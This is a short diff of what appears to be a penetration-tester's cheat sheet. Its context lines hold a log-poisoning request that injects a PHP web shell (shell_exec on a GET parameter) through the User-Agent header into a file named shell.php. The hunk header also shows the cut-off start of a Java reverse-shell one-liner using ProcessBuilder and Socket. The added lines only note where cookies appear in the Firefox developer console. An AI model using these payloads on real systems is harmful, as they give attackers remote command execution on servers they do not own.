@@ -39,3 +39,9 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 POST /log/log.php?filename=shell.php&username=harvey HTTP/1.1
 Host: domain.com
 User-Agent: <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+
+
+#Firefox developer console cookies
+Network -> 200 /location
+-> will open up another menu with cookies
+
